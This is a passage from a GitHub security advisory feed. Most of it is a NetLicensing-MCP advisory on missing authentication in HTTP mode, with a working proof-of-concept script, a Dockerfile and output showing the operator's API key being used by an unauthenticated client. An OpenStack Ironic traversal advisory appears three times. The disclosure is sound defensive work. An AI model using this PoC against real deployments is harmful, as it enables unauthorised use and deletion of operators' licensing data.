              self.headers.get("Authorization"), flush=True)
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"items": {"item": []}}).encode())
    def log_message(self, *args): pass
HTTPServer(("127.0.0.1", 19090), H).serve_forever()
PY

# Terminal 2 — vulnerable MCP server in HTTP mode with a server-side API key
NETLICENSING_API_KEY=SERVERSECRET \
NETLICENSING_BASE_URL=http://127.0.0.1:19090/core/v2/rest \
MCP_HOST=127.0.0.1 MCP_PORT=18181 PYTHONPATH=src \
python3 -m netlicensing_mcp.server http

# Terminal 3 — attacker: connect with NO API key and invoke a tool
python3 - &lt;&lt;'PY'
import asyncio
from mcp import ClientSession
from mcp.client.streamable_http import streamablehttp_client

async def main():
    async with streamablehttp_client("http://127.0.0.1:18181/mcp") as (read, write, _):
        async with ClientSession(read, write) as session:
            await session.initialize()
            print(await session.call_tool("netlicensing_list_products", {"filter": ""}))

asyncio.run(main())
PY
</code></pre>
<p><strong>Expected output in Terminal 1:</strong></p>
<pre><code>MOCK_REQUEST GET /core/v2/rest/product Basic YXBpS2V5OlNFUlZFUlNFQ1JFVA==
</code></pre>
<p>Decoding the Base64 credential confirms the operator's secret was used:</p>
<pre><code>$ echo YXBpS2V5OlNFUlZFUlNFQ1JFVA== | base64 -d
apiKey:SERVERSECRET
</code></pre>
<p><strong>Observed evidence from dynamic reproduction (Phase 2):</strong></p>
<pre><code>[MOCK_UPSTREAM] GET /core/v2/rest/product  Authorization=Basic YXBpS2V5OlNFUlZFUlNFQ1JFVA==
Decoded: apiKey:SERVERSECRET
[EXPLOIT CONFIRMED] Unauthenticated MCP client caused the server to forward its own
NETLICENSING_API_KEY='SERVERSECRET' to the upstream NetLicensing API.
CWE-306 / VULN-001 reproduced.
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a <strong>Missing Authentication for Critical Function (CWE-306)</strong> vulnerability. Any network-reachable attacker who can send HTTP requests to the <code>/mcp</code> endpoint can invoke the full set of MCP tools — including read, create, update, and delete operations — without supplying any credential. The attacker's requests are transparently executed under the server operator's NetLicensing account.</p>
<p>Concrete consequences include:</p>
<ul>
<li><strong>Confidentiality</strong>: enumeration of all products, licenses, licensees, and transactions associated with the operator's account.</li>
<li><strong>Integrity</strong>: creation of new licenses or licensees, modification of existing license parameters, and forging token-based validations.</li>
<li><strong>Availability</strong>: bulk deletion of products, licenses, or licensees, destroying the operator's licensing configuration.</li>
</ul>
<p><strong>Who is impacted</strong>: Operators who deploy <code>netlicensing-mcp</code> in HTTP transport mode (<code>python3 -m netlicensing_mcp.server http</code>) with <code>NETLICENSING_API_KEY</code> set as a server-side environment variable and expose the service on a network-reachable interface. This deployment pattern is officially documented in the project README for remote/shared and cloud deployments.</p>
<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
<h4 id="dockerfile"><code>Dockerfile</code></h4>
<pre><code class="language-dockerfile">FROM python:3.12-slim

RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends git \
 &amp;&amp; rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy repo (with .git for hatch-vcs versioning) and PoC script
COPY repo/ /app/repo/
COPY vuln-001/poc.py /app/poc.py

# Install the vulnerable MCP server package and its dependencies
RUN cd /app/repo &amp;&amp; pip install --no-cache-dir .

CMD ["python3", "/app/poc.py"]
</code></pre>
<h4 id="pocpy"><code>poc.py</code></h4>
<pre><code class="language-python">#!/usr/bin/env python3
"""
PoC for VULN-001: Unauthenticated Use of Server-Side NetLicensing API Key in HTTP Mode
CWE-306 — Missing Authentication for Critical Function

Attack scenario:
 1. Operator runs MCP server in HTTP mode with NETLICENSING_API_KEY set server-side.
 2. Attacker connects to /mcp endpoint supplying NO API key whatsoever.
 3. ApiKeyMiddleware (server.py:1427) passes the request through unconditionally.
 4. Downstream client.py:30 falls back to the server-env NETLICENSING_API_KEY.
 5. The upstream NetLicensing REST API receives the operator's credential — attacker
 effectively uses the operator's account for all MCP tool invocations.

Expected evidence: mock upstream prints
 Authorization: Basic YXBpS2V5OlNFUlZFUlNFQ1JFVA==
 Decoded: apiKey:SERVERSECRET
even though the MCP client sent no credentials.
"""

import asyncio
import base64
import json
import os
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

# ─── Configuration ────────────────────────────────────────────────────────────

MOCK_PORT = 19090
MCP_PORT = 18181
SERVER_API_KEY = "SERVERSECRET" # simulated operator secret injected via env var

# ─── Mock upstream NetLicensing REST API ─────────────────────────────────────

captured_requests: list[dict] = []
mock_ready = threading.Event()


class MockUpstreamHandler(BaseHTTPRequestHandler):
 def _handle(self):
 auth = self.headers.get("Authorization", "&lt;none&gt;")
 entry = {
 "method": self.command,
 "path": self.path,
 "authorization": auth,
 }
 captured_requests.append(entry)
 print(
 f"[MOCK_UPSTREAM] {self.command} {self.path} "
 f"Authorization={auth}",
 flush=True,
 )
 self.send_response(200)
 self.send_header("Content-Type", "application/json")
 self.end_headers()
 self.wfile.write(json.dumps({"items": {"item": []}}).encode())

 do_GET = _handle
 do_POST = _handle
 do_PUT = _handle

 def log_message(self, *args):
 pass


def _run_mock(port: int) -&gt; None:
 srv = HTTPServer(("127.0.0.1", port), MockUpstreamHandler)
 mock_ready.set()
 srv.serve_forever()


# ─── Helpers ─────────────────────────────────────────────────────────────────

def _decode_basic(header: str) -&gt; str | None:
 if not header.startswith("Basic "):
 return None
 try:
 return base64.b64decode(header[6:]).decode()
 except Exception:
 return None


async def _wait_for_mcp(host: str, port: int, timeout: float = 15.0) -&gt; bool:
 """Poll until the MCP /health endpoint responds or timeout."""
 import httpx
 deadline = time.monotonic() + timeout
 while time.monotonic() &lt; deadline:
 try:
 async with httpx.AsyncClient() as c:
 r = await c.get(f"http://{host}:{port}/health", timeout=1)
 if r.status_code &lt; 500:
 return True
 except Exception:
 pass
 await asyncio.sleep(0.4)
 return False


# ─── PoC ──────────────────────────────────────────────────────────────────────

async def main() -&gt; None:
 # 1. Start mock upstream
 t = threading.Thread(target=_run_mock, args=(MOCK_PORT,), daemon=True)
 t.start()
 mock_ready.wait(timeout=5)
 print(f"[*] Mock upstream listening on 127.0.0.1:{MOCK_PORT}", flush=True)

 # 2. Launch vulnerable MCP server in HTTP mode with server-side API key
 env = os.environ.copy()
 env.update({
 "NETLICENSING_API_KEY": SERVER_API_KEY,
 "NETLICENSING_BASE_URL": f"http://127.0.0.1:{MOCK_PORT}/core/v2/rest",
 "MCP_HOST": "127.0.0.1",
 "MCP_PORT": str(MCP_PORT),
 })
 proc = subprocess.Popen(
 [sys.executable, "-m", "netlicensing_mcp.server", "http"],
 env=env,
 cwd="/app/repo",
 stdout=subprocess.PIPE,
 stderr=subprocess.PIPE,
 )
 print(f"[*] Vulnerable MCP server started (pid={proc.pid})", flush=True)

 ready = await _wait_for_mcp("127.0.0.1", MCP_PORT, timeout=15)
 if not ready:
 # /health may not exist; just wait a fixed time
 print("[*] /health not responding — waiting 5 s anyway ...", flush=True)
 await asyncio.sleep(5)

 if proc.poll() is not None:
 _, err = proc.communicate()
 print(f"[!] MCP server exited unexpectedly:\n{err.decode()}", flush=True)
 sys.exit(1)

 print(f"[*] MCP server ready on 127.0.0.1:{MCP_PORT}", flush=True)

 # 3. Attack: connect WITHOUT any API key and invoke a tool
 print(
 "\n[ATTACK] Sending MCP tool call to netlicensing_list_products "
 "with NO client API key ...",
 flush=True,
 )
 try:
 from mcp import ClientSession
 from mcp.client.streamable_http import streamablehttp_client

 async with streamablehttp_client(
 f"http://127.0.0.1:{MCP_PORT}/mcp"
 ) as (read, write, _):
 async with ClientSession(read, write) as session:
 await session.initialize()
 result = await session.call_tool(
 "netlicensing_list_products", {"filter": ""}
 )
 print(f"[*] Tool call succeeded: {result}", flush=True)
 except Exception as exc:
 print(f"[*] MCP client exception (may be normal upstream error): {exc}", flush=True)
 finally:
 proc.terminate()
 await asyncio.sleep(0.5)

 # 4. Evaluate captured evidence
 print("\n" + "=" * 70, flush=True)
 print("CAPTURED UPSTREAM REQUESTS:", flush=True)
 for req in captured_requests:
 print(f" {req['method']} {req['path']}", flush=True)
 print(f" Authorization: {req['authorization']}", flush=True)
 decoded = _decode_basic(req["authorization"])
 if decoded:
 print(f" Decoded: {decoded}", flush=True)
 print("=" * 70, flush=True)

 # 5. Verdict
 server_key_leaked = any(
 SERVER_API_KEY in (_decode_basic(r["authorization"]) or "")
 for r in captured_requests
 )

 if server_key_leaked:
 print(
 f"\n[EXPLOIT CONFIRMED] Unauthenticated MCP client caused the server to "
 f"forward its own NETLICENSING_API_KEY='{SERVER_API_KEY}' to the upstream "
 f"NetLicensing API. CWE-306 / VULN-001 reproduced.",
 flush=True,
 )
 sys.exit(0)
 elif not captured_requests:
 print(
 "\n[FAIL] No upstream requests captured — the MCP tool call did not "
 "reach the upstream API.",
 flush=True,
 )
 sys.exit(2)
 else:
 print(
 "\n[FAIL] Upstream requests captured but server API key not found in "
 "Authorization headers.",
 flush=True,
 )
 sys.exit(2)


if __name__ == "__main__":
 asyncio.run(main())
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Labs64/NetLicensing-MCP/security/advisories/GHSA-x9vc-9ffq-p3gj">https://github.com/Labs64/NetLicensing-MCP/security/advisories/GHSA-x9vc-9ffq-p3gj</a></li>
<li><a href="https://github.com/Labs64/NetLicensing-MCP/commit/fbbb1d5ff88eb5400ec933a84e75601ebee48927">https://github.com/Labs64/NetLicensing-MCP/commit/fbbb1d5ff88eb5400ec933a84e75601ebee48927</a></li>
<li><a href="https://github.com/Labs64/NetLicensing-MCP/releases/tag/0.1.6">https://github.com/Labs64/NetLicensing-MCP/releases/tag/0.1.6</a></li>
<li><a href="https://github.com/advisories/GHSA-x9vc-9ffq-p3gj">https://github.com/advisories/GHSA-x9vc-9ffq-p3gj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x9vc-9ffq-p3gj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-14T20:47:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ironic] OpenStack Ironic allows file overwrite via directory traversal during deployment with a crafted ISO image]]></title>
        <id>https://github.com/advisories/GHSA-9v62-qx4c-44x5</id>
        <link href="https://github.com/advisories/GHSA-9v62-qx4c-44x5"/>
        <updated>2026-07-14T19:50:44.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Ironic through before 35.0.2 allows file overwrite via directory traversal during deployment with a crafted ISO image.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48681">https://nvd.nist.gov/vuln/detail/CVE-2026-48681</a></li>
<li><a href="https://bugs.launchpad.net/ironic/+bug/2148333">https://bugs.launchpad.net/ironic/+bug/2148333</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/06/03/12">https://www.openwall.com/lists/oss-security/2026/06/03/12</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/06/03/12">http://www.openwall.com/lists/oss-security/2026/06/03/12</a></li>
<li><a href="https://github.com/advisories/GHSA-9v62-qx4c-44x5">https://github.com/advisories/GHSA-9v62-qx4c-44x5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9v62-qx4c-44x5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-04T06:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ironic] OpenStack Ironic allows file overwrite via directory traversal during deployment with a crafted ISO image]]></title>
        <id>https://github.com/advisories/GHSA-9v62-qx4c-44x5</id>
        <link href="https://github.com/advisories/GHSA-9v62-qx4c-44x5"/>
        <updated>2026-07-14T19:50:44.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Ironic through before 35.0.2 allows file overwrite via directory traversal during deployment with a crafted ISO image.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48681">https://nvd.nist.gov/vuln/detail/CVE-2026-48681</a></li>
<li><a href="https://bugs.launchpad.net/ironic/+bug/2148333">https://bugs.launchpad.net/ironic/+bug/2148333</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/06/03/12">https://www.openwall.com/lists/oss-security/2026/06/03/12</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/06/03/12">http://www.openwall.com/lists/oss-security/2026/06/03/12</a></li>
<li><a href="https://github.com/advisories/GHSA-9v62-qx4c-44x5">https://github.com/advisories/GHSA-9v62-qx4c-44x5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9v62-qx4c-44x5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-04T06:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ironic] OpenStack Ironic allows file overwrite via directory traversal during deployment with a crafted ISO image]]></title>
        <id>https://github.com/advisories/GHSA-9v62-qx4c-44x5</id>
        <link href="https://github.com/advisories/GHSA-9v62-qx4c-44x5"/>
        <updated>2026-07-14T19:50:44.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Ironic through before 35.0.2 allows file overwrite via directory traversal during deployment with a crafted ISO image.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48681">https://nvd.nist.gov/vuln/detail/CVE-2026-48681</a></li>
<li><a href="https://bugs.launchpad.net/ironic/+bug/2148333">https://bugs.launchpad.net/ironic/+bug/2148333</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/06/03/12">https://www.openwall.com/lists/oss-security/2026/06/03/12</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/06/03/12">http://www.openwall.com/lists/oss-security/2026/06/03/12</a></li>
<li><a href="https://github.com/advisories/GHSA-9v62-qx4c-44x5">https://github.com/advisories/GHSA-9v62-qx4c-44x5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9v62-qx4c-44x5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-04T06:30:25.000Z</published>
    </entry>
</feed>